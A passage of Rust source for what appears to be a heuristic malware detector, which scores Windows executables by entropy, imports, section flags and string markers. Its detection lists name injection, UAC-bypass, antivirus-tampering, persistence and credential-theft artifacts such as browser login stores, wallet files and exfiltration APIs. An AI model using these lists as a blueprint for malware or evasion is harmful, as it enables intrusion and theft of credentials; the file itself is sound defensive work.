use goblin::Object;
use std::collections::HashSet;
use std::path::Path;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use crate::layers::unpacking::assess_unpacking;
use thiserror::Error;

/// Version of the built-in static rulebook and feature interpretation.
pub const STATIC_RULES_VERSION: u64 = 4;

/// Heuristic analysis result with normalized score and textual indicators.
#[derive(Debug, Clone, PartialEq)]
pub struct HeuristicScore {
    pub score: f32, // 0.0 ..= 1.0
    pub indicators: Vec<String>,
}

/// Small, explainable compiler/toolchain fingerprint. It is deliberately a
/// weak signal: missing PDB data and old linkers are common in legitimate
/// release builds and must never classify a file by themselves.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CompilerFingerprint {
    pub linker_version: String,
    pub pdb_path: String,
    pub compile_timestamp: u32,
}

impl CompilerFingerprint {
    pub fn score_anomaly(&self) -> f32 {
        let mut score: f32 = 0.0;
        let linker_major = self
            .linker_version
            .split('.')
            .next()
            .and_then(|value| value.parse::<u32>().ok())
            .unwrap_or_default();
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs() as u32;
        let recent_build = self.compile_timestamp != 0
            && self.compile_timestamp >= now.saturating_sub(8 * 365 * 24 * 60 * 60);
        if linker_major > 0 && linker_major <= 6 && recent_build {
            score += 0.25;
        }

        let pdb = self.pdb_path.to_ascii_lowercase();
        if ["\\desktop\\", "\\downloads\\", "\\temp\\", "\\hacker\\"]
            .iter()
            .any(|marker| pdb.contains(marker))
        {
            score += 0.15;
        }
        score.clamp(0.0, 1.0)
    }
}

#[derive(Debug, Clone, PartialEq)]
pub struct EntropyProfile {
    pub blocks: Vec<f32>,
    pub mean: f32,
    pub variance: f32,
    pub peak: f32,
}

impl EntropyProfile {
    /// Return a bounded explanatory score. A flat, very high-entropy profile
    /// is more consistent with encryption than ordinary compression, but it
    /// remains a heuristic and is only added as one evidence family.
    pub fn score(&self) -> f32 {
        if self.blocks.len() >= 8 && self.mean >= 7.85 && self.variance <= 0.04 {
            0.55
        } else if self.mean >= 7.0 && self.variance >= 0.12 {
            0.10
        } else {
            0.0
        }
    }
}

pub fn analyze_entropy_distribution(bytes: &[u8]) -> EntropyProfile {
    if bytes.is_empty() {
        return EntropyProfile {
            blocks: Vec::new(),
            mean: 0.0,
            variance: 0.0,
            peak: 0.0,
        };
    }
    let block_size = ((bytes.len() + 63) / 64).max(1);
    let blocks: Vec<f32> = bytes.chunks(block_size).take(64).map(entropy).collect();
    let mean = blocks.iter().sum::<f32>() / blocks.len() as f32;
    let variance = blocks
        .iter()
        .map(|value| (value - mean).powi(2))
        .sum::<f32>()
        / blocks.len() as f32;
    let peak = blocks.iter().copied().fold(0.0, f32::max);
    EntropyProfile {
        blocks,
        mean,
        variance,
        peak,
    }
}

/// Score only combinations that have independent intent. A single API such
/// as DeleteFile or CreateRemoteThread remains neutral here because it is
/// common in installers, debuggers and cleanup tools.
pub fn score_api_combinations(imports: &[String]) -> f32 {
    let normalized: Vec<String> = imports
        .iter()
        .map(|value| value.to_ascii_lowercase())
        .collect();
    let has_any = |names: &[&str]| {
        names
            .iter()
            .any(|name| normalized.iter().any(|value| value.contains(name)))
    };
    let inject = has_any(&[
        "virtualallocex",
        "writeprocessmemory",
        "ntwritevirtualmemory",
        "createremotethread",
        "ntcreatethreadex",
    ]);
    let delete = has_any(&["deletefile", "ntdeletefile", "movefile"]);
    let registry = has_any(&["regsetvalueex", "regcreatekey", "ntcreatekey"]);
    if !inject {
        return 0.0;
    }
    let mut score: f32 = 0.0;
    if delete {
        score += 0.22;
    }
    if registry {
        score += 0.22;
    }
    if delete && registry {
        score += 0.12;
    }
    score.min(1.0)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PathContext {
    System32,
    System32Drivers,
    SysWow64,
    ProgramFiles,
    TempDirectory,
    Downloads,
    Desktop,
    Other,
}

pub fn classify_path_context(path: &Path) -> PathContext {
    let normalized = format!(
        "\\{}\\",
        path.to_string_lossy()
            .replace('/', "\\")
            .to_ascii_lowercase()
    );
    if normalized.contains("\\windows\\system32\\drivers\\") {
        PathContext::System32Drivers
    } else if normalized.contains("\\windows\\system32\\") {
        PathContext::System32
    } else if normalized.contains("\\windows\\syswow64\\") {
        PathContext::SysWow64
    } else if normalized.contains("\\program files\\") {
        PathContext::ProgramFiles
    } else if normalized.contains("\\local\\temp\\") || normalized.contains("\\temp\\") {
        PathContext::TempDirectory
    } else if normalized.contains("\\downloads\\") {
        PathContext::Downloads
    } else if normalized.contains("\\desktop\\") {
        PathContext::Desktop
    } else {
        PathContext::Other
    }
}

/// Apply only bounded contextual adjustments. Strong evidence is never
/// erased just because a file is under System32; driver-directory writes are
/// slightly more concerning, while standard installation locations are only
/// mildly down-weighted.
pub fn adjust_score_by_path(base_score: f32, path: &Path) -> f32 {
    let multiplier = match classify_path_context(path) {
        PathContext::System32 | PathContext::SysWow64 => {
            if base_score < 0.55 {
                0.90
            } else {
                1.0
            }
        }
        PathContext::System32Drivers => 1.10,
        PathContext::ProgramFiles => 0.95,
        PathContext::TempDirectory | PathContext::Downloads | PathContext::Desktop => 1.05,
        PathContext::Other => 1.0,
    };
    (base_score * multiplier).clamp(0.0, 1.0)
}

#[derive(Debug, Error)]
pub enum HeuristicError {
    #[error("parsing error: {0}")]
    Parse(String),
}

#[derive(Clone, Debug, PartialEq)]
pub struct HeuristicRule {
    pub id: &'static str,
    pub weight: f32,
    pub description: &'static str,
}

pub fn static_rulebook() -> Vec<HeuristicRule> {
    vec![
        HeuristicRule {
            id: "many_sections",
            weight: 0.15,
            description: "Executable contains an unusually large number of sections",
        },
        HeuristicRule {
            id: "high_section_entropy",
            weight: 0.25,
            description: "Section entropy is consistent with packed or encrypted data",
        },
        HeuristicRule {
            id: "flat_high_entropy_payload",
            weight: 0.18,
            description: "A flat high-entropy profile is consistent with encrypted payload data",
        },
        HeuristicRule {
            id: "packer_detected",
            weight: 0.10,
            description: "A known executable packer marker was detected",
        },
        HeuristicRule {
            id: "obfuscated_command_strings",
            weight: 0.12,
            description: "Obfuscated command or network strings decode to high-risk content",
        },
        HeuristicRule {
            id: "unpacking_decoded_embedded_pe",
            weight: 0.42,
            description: "A bounded decode revealed an embedded PE header",
        },
        HeuristicRule {
            id: "wx_section",
            weight: 0.30,
            description: "Section has write and execute permissions",
        },
        HeuristicRule {
            id: "tls_callbacks",
            weight: 0.10,
            description: "TLS callback table is populated",
        },
        HeuristicRule {
            id: "suspicious_imports",
            weight: 0.20,
            description: "Imports expose memory, injection, or dynamic API resolution",
        },
        HeuristicRule {
            id: "timestamp_anomaly",
            weight: 0.05,
            description: "Executable timestamp is missing, stale, or in the future",
        },
        HeuristicRule {
            id: "entry_point_anomaly",
            weight: 0.15,
            description: "Entry point is outside an executable section",
        },
        HeuristicRule {
            id: "unsafe_segment_flags",
            weight: 0.20,
            description: "Load segment is simultaneously readable, writable, and executable",
        },
        HeuristicRule {
            id: "many_deps",
            weight: 0.10,
            description: "Executable imports an unusually large dependency set",
        },
        HeuristicRule {
            id: "api_injection_chain",
            weight: 0.70,
            description: "VirtualAlloc + WriteProcessMemory + CreateRemoteThread",
        },
        HeuristicRule {
            id: "api_context_combo",
            weight: 0.22,
            description: "Process-memory manipulation is combined with deletion or registry persistence",
        },
        HeuristicRule {
            id: "compiler_toolchain_anomaly",
            weight: 0.12,
            description: "Compiler/toolchain metadata is unusual for the claimed build age",
        },
        HeuristicRule {
            id: "api_ransom_chain",
            weight: 0.40,
            description: "CryptAcquireContext + CryptEncrypt + DeleteFile / MoveFile",
        },
        HeuristicRule {
            id: "privilege_escalation_chain",
            weight: 0.50,
            description: "OpenProcessToken + AdjustTokenPrivileges + OpenProcess",
        },
        HeuristicRule {
            id: "hooking_chain",
            weight: 0.30,
            description: "SetWindowsHookEx + GetAsyncKeyState or keyboard capture",
        },
        HeuristicRule {
            id: "dynamic_load_chain",
            weight: 0.20,
            description: "GetProcAddress + LoadLibrary usage for native API resolution",
        },
        HeuristicRule {
            id: "white_black_sideload_injection",
            weight: 0.48,
            description: "Proxy-DLL side-loading artifacts are combined with in-memory execution or process injection",
        },
        HeuristicRule {
            id: "embedded_payload",
            weight: 0.25,
            description: "Embedded PE or encrypted block inside resource/data section",
        },
        HeuristicRule {
            id: "authenticode_anomaly",
            weight: 0.25,
            description: "Unsigned or invalid signature or mismatched issuer",
        },
        HeuristicRule {
            id: "threadpool_obfuscation",
            weight: 0.34,
            description: "Windows thread-pool scheduling is combined with dynamic memory or API resolution",
        },
        HeuristicRule {
            id: "reflective_loader_chain",
            weight: 0.42,
            description: "Window enumeration or exported callback is combined with in-memory code loading",
        },
        HeuristicRule {
            id: "driver_security_termination",
            weight: 0.72,
            description: "Vulnerable security driver marker is combined with process-termination capability",
        },
        HeuristicRule {
            id: "defender_tampering_chain",
            weight: 0.60,
            description: "AMSI/ETW or Defender configuration is modified together with execution or service control",
        },
        HeuristicRule {
            id: "uac_bypass_chain",
            weight: 0.46,
            description: "Known UAC-bypass target is combined with process creation or shell execution",
        },
        HeuristicRule {
            id: "persistence_chain",
            weight: 0.36,
            description: "Startup, scheduled-task, or service persistence indicators occur together",
        },
        HeuristicRule {
            id: "credential_harvest_chain",
            weight: 0.42,
            description: "Clipboard or foreground-window text access is combined with credential-store artifacts and collection/exfiltration support",
        },
        HeuristicRule {
            id: "embedded_pe_payload",
            weight: 0.38,
            description: "A second PE image is embedded in a non-trivial executable payload",
        },
        HeuristicRule {
            id: "encrypted_overlay_payload",
            weight: 0.30,
            description: "Large high-entropy overlay data is appended after the PE image",
        },
        HeuristicRule {
            id: "rtlo_filename_spoofing",
            weight: 0.35,
            description: "Filename uses right-to-left override characters to disguise its extension",
        },
    ]
}

pub fn score_static_signals(signals: &[String]) -> HeuristicScore {
    let mut matched = Vec::new();
    let mut matched_weights = Vec::new();
    let mut matched_ids = HashSet::new();
    let signal_lower: Vec<String> = signals
        .iter()
        .map(|signal| signal.to_ascii_lowercase())
        .collect();
    let rulebook = static_rulebook();
    for rule in rulebook {
        let name = rule.id;
        let mut matched_rule = false;
        match name {
            "many_sections" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("many_sections"));
            }
            "high_section_entropy" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("high_section_entropy"));
            }
            "flat_high_entropy_payload" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("flat_high_entropy_payload"));
            }
            "packer_detected" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("packer_detected:"));
            }
            "obfuscated_command_strings" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("obfuscated_command_or_url"));
            }
            "unpacking_decoded_embedded_pe" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("unpacking_decoded_embedded_pe"));
            }
            "wx_section" => {
                matched_rule = signal_lower.iter().any(|s| {
                    s.contains("wx_section") || s.contains("write_execute") || s.contains("w^x")
                });
            }
            "tls_callbacks" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("tls") && s.contains("callback"));
            }
            "suspicious_imports" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("suspicious_imports"));
            }
            "timestamp_anomaly" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("timestamp_anomaly"));
            }
            "entry_point_anomaly" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("entry_point_anomaly"));
            }
            "unsafe_segment_flags" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("unsafe_segment_flags"));
            }
            "many_deps" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("many_deps"));
            }
            "api_injection_chain" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("virtualalloc"))
                    && signal_lower
                        .iter()
                        .any(|s| s.contains("writeprocessmemory"))
                    && signal_lower
                        .iter()
                        .any(|s| s.contains("createremotethread"));
            }
            "api_context_combo" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("api_context_combo"));
            }
            "compiler_toolchain_anomaly" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("compiler_toolchain_anomaly"));
            }
            "api_ransom_chain" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("cryptacquirecontext"))
                    && signal_lower.iter().any(|s| s.contains("cryptencrypt"))
                    && (signal_lower.iter().any(|s| s.contains("deletefile"))
                        || signal_lower.iter().any(|s| s.contains("movefile")));
            }
            "privilege_escalation_chain" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("openprocesstoken"))
                    && signal_lower
                        .iter()
                        .any(|s| s.contains("adjusttokenprivileges"))
                    && signal_lower.iter().any(|s| s.contains("openprocess"));
            }
            "hooking_chain" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("setwindowshookex"))
                    && (signal_lower.iter().any(|s| s.contains("getasynckeystate"))
                        || signal_lower.iter().any(|s| s.contains("keyboard")));
            }
            "dynamic_load_chain" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("getprocaddress"))
                    && signal_lower.iter().any(|s| s.contains("loadlibrary"));
            }
            "white_black_sideload_injection" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("white_black_sideload_injection"));
            }
            "embedded_payload" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("embedded") && s.contains("payload"));
            }
            "authenticode_anomaly" => {
                matched_rule = signal_lower.iter().any(|s| {
                    s.contains("signature")
                        && (s.contains("invalid")
                            || s.contains("expired")
                            || s.contains("mismatch"))
                });
            }
            "rtlo_filename_spoofing" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("rtlo_filename_spoofing"));
            }
            "threadpool_obfuscation" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("threadpool_obfuscation"));
            }
            "reflective_loader_chain" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("reflective_loader_chain"));
            }
            "driver_security_termination" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("driver_security_termination"));
            }
            "defender_tampering_chain" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("defender_tampering_chain"));
            }
            "uac_bypass_chain" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("uac_bypass_chain"));
            }
            "persistence_chain" => {
                matched_rule = signal_lower.iter().any(|s| s.contains("persistence_chain"));
            }
            "credential_harvest_chain" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("credential_harvest_chain"));
            }
            "embedded_pe_payload" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("embedded_pe_payload"));
            }
            "encrypted_overlay_payload" => {
                matched_rule = signal_lower
                    .iter()
                    .any(|s| s.contains("encrypted_overlay_payload"));
            }
            _ => {}
        }
        if matched_rule && matched_ids.insert(name) {
            matched.push(rule.description.to_string());
            matched_weights.push(rule.weight);
        }
    }
    HeuristicScore {
        score: calibrated_score(&matched_weights),
        indicators: matched,
    }
}

pub fn score_dynamic_behavior(events: &[String]) -> HeuristicScore {
    let mut matched = Vec::new();
    let mut matched_weights = Vec::new();
    let joined = events.join(" ").to_ascii_lowercase();

    let mut rules = vec![
        (
            "api_injection_chain",
            0.70,
            "VirtualAlloc + WriteProcessMemory + CreateRemoteThread",
        ),
        (
            "api_ransom_chain",
            0.40,
            "CryptAcquireContext + CryptEncrypt + DeleteFile/MoveFile",
        ),
        (
            "privilege_escalation_chain",
            0.50,
            "OpenProcessToken + AdjustTokenPrivileges + OpenProcess",
        ),
        ("hooking_chain", 0.30, "SetWindowsHookEx + keyboard capture"),
        (
            "dynamic_load_chain",
            0.20,
            "GetProcAddress + LoadLibrary for Native API resolution",
        ),
        (
            "threadpool_obfuscation",
            0.34,
            "Thread-pool work/timer scheduling combined with memory or dynamic API resolution",
        ),
        (
            "driver_security_termination",
            0.72,
            "Security-driver load combined with termination of security processes",
        ),
        (
            "defender_tampering_chain",
            0.60,
            "AMSI/ETW or Defender tampering combined with execution or service control",
        ),
        (
            "persistence_chain",
            0.36,
            "Startup, scheduled-task, or service persistence sequence",
        ),
    ];

    for (id, weight, description) in rules.drain(..) {
        let matched_rule = match id {
            "api_injection_chain" => {
                joined.contains("virtualalloc")
                    && joined.contains("writeprocessmemory")
                    && joined.contains("createremotethread")
            }
            "api_ransom_chain" => {
                joined.contains("cryptacquirecontext")
                    && joined.contains("cryptencrypt")
                    && (joined.contains("deletefile") || joined.contains("movefile"))
            }
            "privilege_escalation_chain" => {
                joined.contains("openprocesstoken")
                    && joined.contains("adjusttokenprivileges")
                    && joined.contains("openprocess")
            }
            "hooking_chain" => {
                joined.contains("setwindowshookex")
                    && (joined.contains("getasynckeystate") || joined.contains("keyboard"))
            }
            "dynamic_load_chain" => {
                joined.contains("getprocaddress") && joined.contains("loadlibrary")
            }
            "threadpool_obfuscation" => {
                let threadpool_hits = [
                    "createthreadpoolwork",
                    "create_threadpool_work",
                    "submitthreadpoolwork",
                    "closethreadpoolwork",
                    "tpallocwork",
                    "tppostwork",
                    "trysubmitthreadpoolcallback",
                    "setthreadpooltimer",
                    "createthreadpooltimer",
                ]
                .iter()
                .filter(|needle| joined.contains(**needle))
                .count();
                threadpool_hits >= 2
                    && ((joined.contains("virtualalloc")
                        || joined.contains("virtualprotect")
                        || joined.contains("ntprotectvirtualmemory")
                        || joined.contains("rtlmovememory"))
                        || joined.contains("getprocaddress"))
            }
            "driver_security_termination" => {
                (joined.contains("amsdk.sys")
                    || joined.contains("zam.exe")
                    || joined.contains("watchdog antimalware"))
                    && (joined.contains("terminateprocess")
                        || joined.contains("ntterminateprocess")
                        || joined.contains("zwterminateprocess"))
            }
            "defender_tampering_chain" => {
                (joined.contains("amsiscanbuffer")
                    || joined.contains("etweventwrite")
                    || joined.contains("disablerealtimemonitoring")
                    || joined.contains("exclusionpath")
                    || joined.contains("mpreference"))
                    && (joined.contains("virtualprotect")
                        || joined.contains("writeprocessmemory")
                        || joined.contains("sc stop")
                        || joined.contains("set-mppreference"))
            }
            "persistence_chain" => {
                let persistence_signals = [
                    "currentversion\\run",
                    "schtasks /create",
                    "create service",
                    "sc create",
                    "\\startup\\",
                ]
                .iter()
                .filter(|needle| joined.contains(**needle))
                .count();
                persistence_signals >= 2
            }
            _ => false,
        };
        if matched_rule {
            matched.push(description.to_string());
            matched_weights.push(weight);
        }
    }

    HeuristicScore {
        score: calibrated_score(&matched_weights),
        indicators: matched,
    }
}

/// Combine evidence with diminishing returns. Several indicators from the
/// same family should not make a sample look certain merely because they are
/// correlated; independent corroboration still raises the score slightly.
fn calibrated_score(weights: &[f32]) -> f32 {
    if weights.is_empty() {
        return 0.0;
    }
    let residual = weights.iter().fold(1.0f32, |residual, weight| {
        residual * (1.0 - weight.clamp(0.0, 0.95))
    });
    let corroboration = ((weights.len().saturating_sub(1)) as f32 * 0.025).min(0.10);
    (1.0 - residual + corroboration).clamp(0.0, 1.0)
}

pub(crate) fn entropy(bytes: &[u8]) -> f32 {
    if bytes.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }
    let len = bytes.len() as f32;
    let mut ent = 0.0f32;
    for &c in counts.iter() {
        if c == 0 {
            continue;
        }
        let p = (c as f32) / len;
        ent -= p * p.log2();
    }
    ent
}

/// Analyze a binary blob and produce a heuristic score.
pub fn analyze_bytes(data: &[u8]) -> Result<HeuristicScore, HeuristicError> {
    let mut indicators: Vec<String> = Vec::new();
    indicators.extend(assess_unpacking(data).indicators);

    // Goblin rejects binaries whose attribute-certificate table runs past
    // end-of-file outright, losing the evidence. Detect that structural
    // anomaly from the raw headers first so tampered signatures still
    // surface as indicators even when full parsing fails.
    if let Some(anomaly) = preparse_certificate_anomaly(data) {
        indicators.push(anomaly);
    }

    match Object::parse(data) {
        Ok(Object::PE(pe)) => {
            let compiler = compiler_fingerprint(
                data,
                pe.header
                    .optional_header
                    .as_ref()
                    .map(|header| header.standard_fields.major_linker_version)
                    .unwrap_or_default(),
                pe.header
                    .optional_header
                    .as_ref()
                    .map(|header| header.standard_fields.minor_linker_version)
                    .unwrap_or_default(),
                pe.header.coff_header.time_date_stamp,
            );
            if compiler.score_anomaly() >= 0.25 {
                indicators.push("compiler_toolchain_anomaly".to_string());
            }
            let entropy_profile = analyze_entropy_distribution(data);
            if entropy_profile.score() >= 0.55 {
                indicators.push("flat_high_entropy_payload".to_string());
            }

            // sections
            let sec_count = pe.sections.len();
            if sec_count > 10 {
                indicators.push(format!("many_sections: {}", sec_count));
            }

            // section entropy
            for s in &pe.sections {
                let start = s.pointer_to_raw_data as usize;
                let size = s.size_of_raw_data as usize;
                if let Some(end) = start.checked_add(size) {
                    if end <= data.len() && size > 0 {
                        let ent = entropy(&data[start..end]);
                        if ent > 7.5 {
                            indicators.push(format!(
                                "high_section_entropy: {} (section {})",
                                ent,
                                s.name().unwrap_or("?")
                            ));
                            break;
                        }
                    }
                }
                // Writable + executable sections are a classic self-modifying
                // code / unpacking-stub layout and rarely needed by ordinary
                // applications.
                let characteristics = s.characteristics;
                let writable =
                    characteristics & goblin::pe::section_table::IMAGE_SCN_MEM_WRITE != 0;
                let executable =
                    characteristics & goblin::pe::section_table::IMAGE_SCN_MEM_EXECUTE != 0;
                if writable && executable {
                    indicators.push(format!(
                        "wx_section: {}",
                        s.name().unwrap_or("?")
                    ));
                }
            }

            // TLS callbacks
            if let Some(optional_header) = &pe.header.optional_header {
                if let Some(datadir) = optional_header.data_directories.get_tls_table().as_ref() {
                    if datadir.size > 0 {
                        indicators.push("tls_callbacks".to_string());
                    }
                }
                // timestamp
                let timestamp = pe.header.coff_header.time_date_stamp;
                if timestamp == 0 || is_timestamp_anomalous(timestamp) {
                    indicators.push(format!("timestamp_anomaly: {}", timestamp));
                }
            }

            // suspicious imports
            let import_names: Vec<String> = pe
                .imports
                .iter()
                .map(|import| import.name.to_ascii_lowercase())
                .collect();
            if score_api_combinations(&import_names) >= 0.20 {
                indicators.push("api_context_combo".to_string());
            }
            let has = |needle: &str| import_names.iter().any(|name| name.contains(needle));
            let suspicious = has("virtualalloc")
                || has("writeprocessmemory")
                || has("getprocaddress")
                || has("loadlibrary")
                || has("createremotethread")
                || has("cryptencrypt")
                || has("adjusttokenprivileges")
                || has("setwindowshookex");
            let injection_chain =
                has("virtualalloc") && has("writeprocessmemory") && has("createremotethread");
            let ransom_chain = has("cryptacquirecontext")
                && has("cryptencrypt")
                && (has("deletefile") || has("movefile"));
            let privilege_chain =
                has("openprocesstoken") && has("adjusttokenprivileges") && has("openprocess");
            // SetWindowsHookEx combined with keyboard polling is a strong
            // static keylogger hint; either API alone is too common to flag.
            // Byte-level scanning keeps this effective against binaries that
            // resolve hooks dynamically without importing them.
            let hooking_chain = (has("setwindowshookex")
                && (has("getasynckeystate")
                    || has("getkeyboardstate")
                    || has("getkeyboardlayout")))
                || (contains_ascii_case_insensitive(data, b"SetWindowsHookEx")
                    && (contains_ascii_case_insensitive(data, b"GetAsyncKeyState")
                        || contains_ascii_case_insensitive(data, b"GetKeyboardState")));
            let dynamic_load_chain = has("getprocaddress") && has("loadlibrary");
            let proxy_library = pe.libraries.iter().any(|library| {
                matches!(
                    library.to_ascii_lowercase().as_str(),
                    "version.dll"
                        | "winmm.dll"
                        | "dbghelp.dll"
                        | "wininet.dll"
                        | "cryptbase.dll"
                        | "uxtheme.dll"
                        | "dinput8.dll"
                )
            });
            let side_load_path_artifact = [
                b"\\appdata\\".as_slice(),
                b"\\local\\temp\\".as_slice(),
                b"\\downloads\\".as_slice(),
                b"\\programdata\\".as_slice(),
            ]
            .iter()
            .any(|marker| contains_ascii_case_insensitive(data, marker));
            let side_load_loader_artifact = contains_ascii_case_insensitive(data, b"dllmain")
                || contains_ascii_case_insensitive(data, b"enumwindows")
                || contains_ascii_case_insensitive(data, b"enumchildwindows");
            let threadpool_api_names = [
                "createthreadpoolwork",
                "create_threadpool_work",
                "submitthreadpoolwork",
                "closethreadpoolwork",
                "tpallocwork",
                "tppostwork",
                "trysubmitthreadpoolcallback",
                "setthreadpooltimer",
                "createthreadpooltimer",
            ];
            let threadpool_hits = threadpool_api_names
                .iter()
                .filter(|needle| has(needle))
                .count();
            let memory_mutation = has("virtualalloc")
                || has("virtualprotect")
                || has("ntprotectvirtualmemory")
                || has("rtlmovememory")
                || has("writeprocessmemory");
            // A single proxy DLL import or a single memory API is common in
            // legitimate software. Require a proxy-library artifact, a
            // side-loading/loader marker, and an in-memory mutation/resolution
            // signal before raising this static white+black indicator.
            let white_black_sideload_injection = proxy_library
                && (side_load_path_artifact || side_load_loader_artifact)
                && (memory_mutation || dynamic_load_chain)
                && (dynamic_load_chain || has("createremotethread"));
            let threadpool_obfuscation = threadpool_hits >= 2
                && ((memory_mutation && (dynamic_load_chain || has("ntflushinstructioncache")))
                    || threadpool_hits >= 3);
            let reflective_loader_chain = (has("enumwindows") || has("enumchildwindows"))
                && (has("virtualprotect") || has("ntprotectvirtualmemory"))
                && (has("rtlmovememory") || has("ntflushinstructioncache") || dynamic_load_chain);
            let driver_marker = contains_ascii_case_insensitive(data, b"amsdk.sys")
                || contains_ascii_case_insensitive(data, b"zam.exe")
                || contains_ascii_case_insensitive(data, b"watchdog antimalware");
            let termination_marker = has("terminateprocess")
                || contains_ascii_case_insensitive(data, b"ntterminateprocess")
                || contains_ascii_case_insensitive(data, b"zwterminateprocess");
            let security_target_marker = [
                b"msmpeng.exe".as_slice(),
                b"windefend".as_slice(),
                b"csfalconservice.exe".as_slice(),
                b"ekrn.exe".as_slice(),
                b"avp.exe".as_slice(),
            ]
            .iter()
            .any(|marker| contains_ascii_case_insensitive(data, marker));
            let driver_security_termination =
                driver_marker && termination_marker && security_target_marker;
            let defender_marker = [
                b"amsiscanbuffer".as_slice(),
                b"etweventwrite".as_slice(),
                b"disablerealtimemonitoring".as_slice(),
                b"exclusionpath".as_slice(),
                b"mpreference".as_slice(),
            ]
            .iter()
            .any(|marker| contains_ascii_case_insensitive(data, marker));
            let defender_tampering_chain = defender_marker
                && (memory_mutation
                    || contains_ascii_case_insensitive(data, b"sc stop")
                    || contains_ascii_case_insensitive(data, b"set-mppreference"));
            let uac_target_marker = [
                b"fodhelper.exe".as_slice(),
                b"eventvwr.exe".as_slice(),
                b"computerdefaults.exe".as_slice(),
                b"sdclt.exe".as_slice(),
            ]
            .iter()
            .any(|marker| contains_ascii_case_insensitive(data, marker));
            let uac_bypass_chain = uac_target_marker
                && (has("shellexecute") || has("createprocess") || has("winexec"));
            let persistence_signals = [
                b"currentversion\\run".as_slice(),
                b"schtasks /create".as_slice(),
                b"create service".as_slice(),
                b"sc create".as_slice(),
                b"\\startup\\".as_slice(),
            ]
            .iter()
            .filter(|marker| contains_ascii_case_insensitive(data, marker))
            .count();
            let persistence_chain = persistence_signals >= 2;
            // Credential harvesting is only flagged when three independent
            // families agree: text capture (clipboard or foreground window),
            // a credential-store artifact, and collection/exfiltration
            // support. Any single family is too common for legitimate tools.
            let credential_capture = has("getclipboarddata")
                || has("openclipboard")
                || has("getwindowtext")
                || contains_ascii_case_insensitive(data, b"GetClipboardData")
                || contains_ascii_case_insensitive(data, b"OpenClipboard")
                || contains_ascii_case_insensitive(data, b"GetWindowText");
            let credential_store = [
                b"logins.json".as_slice(),
                b"cookies.sqlite".as_slice(),
                b"wallet.dat".as_slice(),
                b"login data".as_slice(),
                b"web data".as_slice(),
                b"autofill".as_slice(),
            ]
            .iter()
            .any(|marker| contains_ascii_case_insensitive(data, marker));
            let credential_exfil = has("ftpswebrequest")
                || has("smtpclient")
                || has("httpsendrequest")
                || has("winhttpopen")
                || has("internetopen")
                || contains_ascii_case_insensitive(data, b"FtpWebRequest")
                || contains_ascii_case_insensitive(data, b"SmtpClient")
                || contains_ascii_case_insensitive(data, b"HttpSendRequest")
                || contains_ascii_case_insensitive(data, b"WinHttpOpen");
            let credential_harvest_chain =
                credential_capture && credential_store && credential_exfil;
            if suspicious {
                indicators.push("suspicious_imports".to_string());
            }
            if injection_chain {
                indicators.push("api_injection_chain".to_string());
            }
            if ransom_chain {
                indicators.push("api_ransom_chain".to_string());
            }
            if privilege_chain {
                indicators.push("privilege_escalation_chain".to_string());
            }
            if dynamic_load_chain {
                indicators.push("dynamic_load_chain".to_string());
            }
            if white_black_sideload_injection {
                indicators.push("white_black_sideload_injection".to_string());
            }
            if threadpool_obfuscation {
                indicators.push("threadpool_obfuscation".to_string());
            }
            if reflective_loader_chain {
                indicators.push("reflective_loader_chain".to_string());
            }
            if driver_security_termination {
                indicators.push("driver_security_termination".to_string());
            }
            if defender_tampering_chain {
                indicators.push("defender_tampering_chain".to_string());
            }
            if uac_bypass_chain {
                indicators.push("uac_bypass_chain".to_string());
            }
            if persistence_chain {
                indicators.push("persistence_chain".to_string());
            }
            if credential_harvest_chain {
                indicators.push("credential_harvest_chain".to_string());
            }
            if hooking_chain {
                indicators.push("hooking_chain:setwindowshookex+keyboard".to_string());
            }

            // Certificate table anomalies: the security directory must fit
            // inside the file and its entries are 8-byte aligned by spec.
            if let Some(optional_header) = &pe.header.optional_header {
                if let Some(cert) = optional_header
                    .data_directories
                    .get_certificate_table()
                    .as_ref()
                {
                    if cert.size > 0 {
                        let start = cert.virtual_address as usize;
                        let end = match start.checked_add(cert.size as usize) {
                            Some(end) => end,
                            None => usize::MAX,
                        };
                        if end > data.len() {
                            indicators.push(
                                "signature:mismatch:certificate_table_truncated".to_string(),
                            );
                        } else if cert.size % 8 != 0 {
                            indicators.push(
                                "signature:mismatch:certificate_table_unaligned".to_string(),
                            );
                        }
                    }
                }
            }

            if contains_embedded_pe(data) {
                indicators.push("embedded_pe_payload".to_string());
            }

            let raw_end = pe
                .sections
                .iter()
